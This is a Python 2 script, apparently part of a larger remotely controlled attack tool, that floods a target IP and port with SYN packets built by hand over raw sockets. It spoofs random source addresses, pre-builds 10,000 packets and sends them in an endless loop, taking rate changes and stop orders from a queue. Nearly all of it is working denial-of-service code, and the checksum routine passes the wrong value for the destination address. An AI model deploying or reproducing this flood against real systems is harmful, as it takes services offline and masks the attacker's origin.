'''
    Syn flood program in python using raw sockets (Linux)
     
    Initial: Silver Moon (m00n.silv3r@gmail.com)
'''
 
# some imports
import socket, sys, random, time, Queue
from struct import *
 
 
class SYNFLOOD():
	def __init__(self, Q, TARGET_IP, TARGET_PORT, RATE):
        #threading.Thread.__init__(self) # Required for threaded class
		self.target = TARGET_IP
		self.port = TARGET_PORT
		self.rate = RATE
		self.instruction_q = Q
		
		#create a raw socket
		try:
			self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		except socket.error , msg:
			print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
			sys.exit()
	 
		# tell kernel not to put in headers, since we are providing it
		self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		self.allpackets = []
		
	# checksum functions needed for calculation checksum
	def checksum(self,msg):
		s = 0
		# loop taking 2 characters at a time
		for i in range(0, len(msg), 2):
		    w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
		    s = s + w
		 
		s = (s>>16) + (s & 0xffff);
		#s = s + (s >> 16);
		#complement and mask to 4 byte short
		s = ~s & 0xffff
		return s
	

	def pkt(self):
		# now start constructing the packet
		packet = '';
		 
	#	source_ip = '145.100.105.66'
		source_ip = "%i.%i.%i.%i" % (10,random.randint(1,254),random.randint(1,254),random.randint(1,254))
		#global dest_ip
		#dest_ip = '145.100.104.173' # or socket.gethostbyname('www.google.com')
		 
		# ip header fields
		ihl = 5
		version = 4
		tos = 0
		tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
		id = 54321  #Id of this packet
		frag_off = 0
		ttl = 255
		protocol = socket.IPPROTO_TCP
		check = 10  # python seems to correctly fill the checksum
		saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
		daddr = socket.inet_aton ( self.target )
		 
		ihl_version = (version << 4) + ihl
		 
		# the ! in the pack format string means network order
		ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
		 
		# tcp header fields
		source = 40567   # source port
		#source = random.randint(1000,40000)
		dest = self.port   # destination port
		seq = 0
		ack_seq = 0
		doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
		#tcp flags
		fin = 0
		syn = 1
		rst = 0
		psh = 0
		ack = 0
		urg = 0
		window = socket.htons (5840)    #   maximum allowed window size
		check = 0
		urg_ptr = 0
		 
		offset_res = (doff << 4) + 0
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
		 
		# the ! in the pack format string means network order
		tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
		 
		# pseudo header fields
		source_address = socket.inet_aton( source_ip )
		dest_address = socket.inet_aton(self.target)
        #dest_address = socket.inet_aton(self.target)
		placeholder = 0
		protocol = socket.IPPROTO_TCP
		tcp_length = len(tcp_header)
		 
		psh = pack('!4s4sBBH' , source_address , self.target , placeholder , protocol , tcp_length);
		psh = psh + tcp_header;
		 
		tcp_checksum = self.checksum(psh)
		 
		# make the tcp header again and fill the correct checksum
		tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
		 
		# final full packet - syn packets dont have any data
		packet = ip_header + tcp_header
		 
		#Send the packet finally - the port specified has no effect
		total = 0
		self.allpackets.append(packet)
	#	print packet

	def main(self):
		time1 = time.time()
		for i in range(10000):
				self.pkt()
		while 1:
			i = 0 # Counter
			for P in self.allpackets:
				i += 1
				if i == 20: # Every 20 packets -> Queue.get for possible instructions
					i = 0
					try:
						data = self.instruction_q.get(False)
						data_id = data['id']
						if data[data_id]['status'] == "STOP":
							break # Return to 'Listening' state / Xattacker.run()
						else:
							self.rate = data[data_id]['rate'] # Adjust rate						
					except Queue.Empty:
						pass
                        # Although we should time out if we may be actually DDOSSING ourselfs <------------

				self.s.sendto(P, (self.target , 0 ))    # put this in a loop if you want to flood the target
				time.sleep(float(1)/self.rate)
	 		#print total

